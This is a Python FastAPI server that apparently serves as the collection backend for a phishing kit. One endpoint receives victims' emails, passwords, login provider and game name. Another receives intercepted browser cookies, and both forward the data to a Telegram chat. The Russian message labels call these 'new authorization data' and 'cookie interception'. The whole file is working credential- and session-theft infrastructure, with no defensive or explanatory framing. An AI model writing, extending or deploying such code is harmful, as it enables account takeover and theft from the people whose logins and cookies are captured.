from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx
import os
from dotenv import load_dotenv

load_dotenv()

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

class AuthData(BaseModel):
    email: str
    password: str
    provider: str
    game: str = "unknown"
    ua: str = ""

class CookieData(BaseModel):
    cookies: str
    url: str
    ua: str
    referrer: str = ""

async def send_to_telegram(message: str):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Telegram not configured")
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient(timeout=10) as client:
        try:
            await client.post(url, json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            })
        except Exception as e:
            print(f"Telegram error: {e}")

@app.post("/api/auth")
async def receive_auth(data: AuthData):
    message = (
        f"🔐 <b>Новые данные (Авторизация)</b>\n\n"
        f"📧 <b>Email:</b> <code>{data.email}</code>\n"
        f"🔑 <b>Пароль:</b> <code>{data.password}</code>\n"
        f"🌐 <b>Провайдер:</b> {data.provider}\n"
        f"🎮 <b>Игра:</b> {data.game}\n"
        f"📱 <b>UA:</b> <code>{data.ua[:120]}</code>"
    )
    await send_to_telegram(message)
    return {"status": "ok"}

@app.post("/api/cookies")
async def receive_cookies(data: CookieData):
    message = (
        f"🍪 <b>Перехват куки</b>\n\n"
        f"🌐 <b>URL:</b> {data.url}\n"
        f"📱 <b>UA:</b> <code>{data.ua[:120]}</code>\n"
        f"🔗 <b>Referrer:</b> {data.referrer}\n"
        f"📦 <b>Cookies:</b>\n<code>{data.cookies[:500]}</code>"
    )
    await send_to_telegram(message)
    return {"status": "ok"}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
